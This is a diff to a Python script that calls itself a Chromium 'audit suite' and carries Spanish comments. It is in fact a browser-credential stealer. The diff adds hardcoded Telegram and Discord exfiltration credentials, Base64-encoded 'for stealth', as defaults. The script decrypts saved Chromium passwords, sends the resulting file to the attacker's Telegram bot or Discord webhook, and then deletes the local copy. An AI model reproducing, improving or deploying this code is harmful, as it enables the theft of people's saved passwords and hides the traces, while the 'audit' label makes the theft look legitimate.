@@ -12,6 +12,24 @@ import requests
 from pathlib import Path
 from datetime import datetime
 
+# =========================================================================
+# 🔑 CREDENCIALES HARDCODED (Opcional - Úsalas en BASE64 para sigilo)
+# =========================================================================
+# Tip: Usa un convertidor Online de 'Plain Text to Base64' para estos campos.
+# Ej (Base64): "MTIzNDU2Nzg5MDpBQkMtREVGM..."
+HARDCODED_TG_TOKEN = "" # Token de Telegram (B64)
+HARDCODED_TG_ID = ""    # Chat ID (B64)
+HARDCODED_DS_WEBHOOK = "" # Discord Webhook (B64)
+# =========================================================================
+
+def safe_b64_decode(val):
+    """Decodifica Base64 solo si tiene contenido, de lo contrario devuelve el original."""
+    if not val: return ""
+    try:
+        return base64.b64decode(val).decode('utf-8')
+    except:
+        return val # Si no es B64 válido, devolvemos tal cual (fallback)
+
 # Condicional para win32crypt (solo Windows)
 try:
     import win32crypt
@@ -173,21 +191,30 @@ def main():
     parser = argparse.ArgumentParser(description="Auditor-Chromium Final Suite")
     parser.add_argument("-f", "--format", choices=["csv", "html"], default="html")
     parser.add_argument("-o", "--output", default="audit_report")
-    parser.add_argument("--telegram-token")
-    parser.add_argument("--telegram-chatid")
-    parser.add_argument("--discord")
-    parser.add_argument("--no-wipe", action="store_true")
+    
+    # 🚀 Abreviaturas (Alias) para uso manual rápido
+    parser.add_argument("-t", "--telegram-token", default=safe_b64_decode(HARDCODED_TG_TOKEN), help="Token del bot (TG)")
+    parser.add_argument("-c", "--telegram-chatid", default=safe_b64_decode(HARDCODED_TG_ID), help="Chat ID personal (TG)")
+    parser.add_argument("-d", "--discord", default=safe_b64_decode(HARDCODED_DS_WEBHOOK), help="Webhook URL (Discord)")
+    
+    parser.add_argument("--no-wipe", action="store_true", help="Desactiva el auto-borrado")
 
     args = parser.parse_args()
-    logger.info("Iniciando Suite de Auditoría Final...")
+    
+    # Soporte Universal Base64 (Manual + Hardcoding)
+    token = safe_b64_decode(args.telegram_token)
+    chatid = safe_b64_decode(args.telegram_chatid)
+    discord = safe_b64_decode(args.discord)
+
+    logger.info("Iniciando Suite de Auditoría con soporte universal Base64...")
     
     count, final_file = ChromiumDecryptor().audit(args.format, args.output)
-    logger.info(f"Escaneo finalizado: {count} credenciales extraídas en {final_file}.")
+    logger.info(f"Escaneo finalizado: {count} credenciales extraídas.")
 
     if count > 0:
-        exf = Exfiltrator(args.telegram_token, args.telegram_chatid, args.discord)
-        if args.telegram_token and args.telegram_chatid: exf.send_to_telegram(final_file)
-        if args.discord: exf.send_to_discord(final_file)
+        exf = Exfiltrator(token, chatid, discord)
+        if token and chatid: exf.send_to_telegram(final_file)
+        if discord: exf.send_to_discord(final_file)
         if not args.no_wipe and (args.telegram_token or args.discord):
             Path(final_file).unlink()
 
